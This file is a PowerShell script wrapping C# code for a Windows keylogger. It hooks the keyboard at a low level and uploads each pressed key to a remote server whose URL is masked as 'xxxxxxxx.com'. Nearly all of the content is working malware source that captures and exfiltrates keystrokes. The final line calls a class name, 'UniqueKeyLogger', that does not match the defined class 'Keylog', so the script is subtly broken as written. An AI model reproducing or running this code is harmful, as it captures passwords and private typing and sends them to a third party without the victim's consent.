Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;

public class Keylog
{
    private static string webRequestUrl = "https://xxxxxxxx.com";
    private static WebClient webClient = new WebClient();

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Start()
    {
        IntPtr hookId = IntPtr.Zero;
        IntPtr hInstance = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);

        using (ProcessModule module = Process.GetCurrentProcess().MainModule)
        using (Process currentProcess = Process.GetCurrentProcess())
        {
            hookId = SetWindowsHookEx(13, LowLevelKeyboardProcCallback, hInstance, 0);
        }

        Console.WriteLine("Keylogger is active. Press Enter to stop.");
        Console.ReadLine();  // Wait for Enter key to stop

        UnhookWindowsHookEx(hookId);
    }

    private static void SendKeyData(char keyChar)
    {
        try
        {
            Console.WriteLine("Sending key data: " + keyChar);
            webClient.UploadString(webRequestUrl, keyChar.ToString());
            Console.WriteLine("Key data sent successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Failed to send data. Error: " + ex.Message);
        }
    }

    private static IntPtr LowLevelKeyboardProcCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)0x0100)  // WM_KEYDOWN
        {
            int vkCode = Marshal.ReadInt32(lParam);
            char keyChar = (char)vkCode;

            // Output the pressed key
            Console.WriteLine("Key pressed: " + keyChar);

            // Send the key data to the server
            SendKeyData(keyChar);
        }

        return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
    }
}
"@

[UniqueKeyLogger]::Start()
